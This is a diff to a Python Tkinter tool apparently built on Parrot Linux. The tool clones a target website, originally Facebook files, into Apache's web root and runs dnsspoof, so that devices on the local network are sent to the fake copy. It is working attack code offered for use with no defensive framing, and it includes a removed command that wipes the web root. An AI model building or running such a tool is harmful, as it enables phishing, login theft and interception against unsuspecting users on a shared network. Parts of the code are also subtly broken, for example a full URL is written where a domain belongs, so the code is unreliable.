@@ -6,6 +6,10 @@ import tkinter as tk
 from tkinter import filedialog, messagebox, simpledialog
 import netifaces
 import nmap
+import requests
+from bs4 import BeautifulSoup
+import shutil
+import re
 
 class Tooltip:
     def __init__(self, widget, text):
@@ -40,17 +44,17 @@ class DNS_Spoofing_Tool:
         self.parrot_ip_entry.grid(row=0, column=1, padx=10, pady=5)
         Tooltip(self.parrot_ip_entry, "Your Parrot Linux IP address.")
 
+        # Label and entry for target URL
+        self.target_url_label = tk.Label(root, text="Target URL:")
+        self.target_url_label.grid(row=1, column=0, padx=10, pady=5)
+        self.target_url_entry = tk.Entry(root)
+        self.target_url_entry.grid(row=1, column=1, padx=10, pady=5)
+        Tooltip(self.target_url_entry, "Enter the URL of the website you want to clone.")
+
         # Button to scan for available target IPs
         self.scan_button = tk.Button(root, text="Scan for Target IPs", command=self.scan_ips)
         self.scan_button.grid(row=0, column=2, padx=10, pady=5)
         Tooltip(self.scan_button, "Scan for available target IP addresses in the network.")
-
-        # Label and entry for target domain
-        self.target_domain_label = tk.Label(root, text="Target Domain:")
-        self.target_domain_label.grid(row=1, column=0, padx=10, pady=5)
-        self.target_domain_entry = tk.Entry(root)
-        self.target_domain_entry.grid(row=1, column=1, padx=10, pady=5)
-        Tooltip(self.target_domain_entry, "Enter the target domain to spoof.")
 
         # Dropdown for network interface
         self.interface_label = tk.Label(root, text="Network Interface:")
@@ -68,11 +72,6 @@ class DNS_Spoofing_Tool:
         self.target_ips_text = tk.Text(root, height=5, width=50)
         self.target_ips_text.grid(row=3, column=1, columnspan=2, padx=10, pady=5)
         Tooltip(self.target_ips_text, "List of available target IP addresses found in the network.")
-
-        # Button to select downloaded Facebook folder
-        self.select_folder_button = tk.Button(root, text="Select Downloaded Facebook Folder", command=self.select_folder)
-        self.select_folder_button.grid(row=4, column=0, columnspan=2, padx=10, pady=5)
-        Tooltip(self.select_folder_button, "Select the folder containing downloaded Facebook files.")
 
         # Button to start DNS spoofing
         self.start_button = tk.Button(root, text="Start DNS Spoofing", command=self.start_dns_spoofing)
@@ -111,32 +110,69 @@ class DNS_Spoofing_Tool:
         else:
             raise ValueError("Invalid IP range")
 
+    def download_website(self, url, folder_path):
+        # Download website contents and save locally
+        response = requests.get(url)
+        soup = BeautifulSoup(response.content, 'html.parser')
+        
+        # Create folder if not exists
+        if not os.path.exists(folder_path):
+            os.makedirs(folder_path)
+
+        # Save HTML file
+        with open(os.path.join(folder_path, 'index.html'), 'w') as file:
+            file.write(soup.prettify())
+
+        # Download and save CSS files
+        for link in soup.find_all('link', href=True):
+            css_url = link['href']
+            if css_url.startswith(('http://', 'https://')):
+                css_response = requests.get(css_url)
+                css_file_name = re.sub(r'\W+', '', os.path.basename(css_url))  # Remove non-alphanumeric characters
+                with open(os.path.join(folder_path, css_file_name), 'wb') as css_file:
+                    css_file.write(css_response.content)
+
+        # Download and save JavaScript files
+        for script in soup.find_all('script', src=True):
+            js_url = script['src']
+            if js_url.startswith(('http://', 'https://')):
+                js_response = requests.get(js_url)
+                js_file_name = re.sub(r'\W+', '', os.path.basename(js_url))  # Remove non-alphanumeric characters
+                with open(os.path.join(folder_path, js_file_name), 'wb') as js_file:
+                    js_file.write(js_response.content)
+
+        messagebox.showinfo("Success", f"Website downloaded successfully to {folder_path}")
+
     def select_folder(self):
-        # Opens file dialog to select downloaded Facebook folder
+        # Opens file dialog to select folder for downloaded website files
         self.downloaded_folder = filedialog.askdirectory()
 
     def start_dns_spoofing(self):
         try:
-            # Get Parrot Linux IP, target domain, and selected network interface
+            # Get Parrot Linux IP, target URL, and selected network interface
             parrot_ip = self.parrot_ip_entry.get()
-            target_domain = self.target_domain_entry.get()
+            target_url = self.target_url_entry.get()
             selected_interface = self.interface_var.get()
 
-            # Update hosts.txt with Parrot Linux IP and target domain
-            hosts_file_path = "/tmp/hosts.txt"
-            with open(hosts_file_path, "w") as f:
-                f.write(f"{parrot_ip} {target_domain}")
-
-            # Move downloaded Facebook files to Apache's root directory
+            # Download website contents
             if self.downloaded_folder:
-                os.system(f"sudo rm -rf /var/www/html/*")
-                os.system(f"sudo mv {self.downloaded_folder}/* /var/www/html/")
+                self.download_website(target_url, self.downloaded_folder)
 
-            # Start DNS spoofing with selected network interface
-            subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])
-            messagebox.showinfo("Success", "DNS Spoofing started successfully!")
+                # Update hosts.txt with Parrot Linux IP and target URL
+                hosts_file_path = "/tmp/hosts.txt"
+                with open(hosts_file_path, "w") as f:
+                    f.write(f"{parrot_ip} {target_url}")
+
+                # Move downloaded website files to Apache's root directory
+                shutil.move(self.downloaded_folder, "/var/www/html/")
+
+                # Start DNS spoofing with selected network interface
+                subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])
+                messagebox.showinfo("Success", "DNS Spoofing started successfully!")
+            else:
+                messagebox.showerror("Error", "Please select a folder for downloaded website files.")
         except Exception as e:
-            messagebox.showerror("Error", f"An error occurred while starting DNS spoofing: {str(e)}")
+            messagebox.showerror("Error", f"An error occurred: {str(e)}")
 
 if __name__ == "__main__":
     root = tk.Tk()
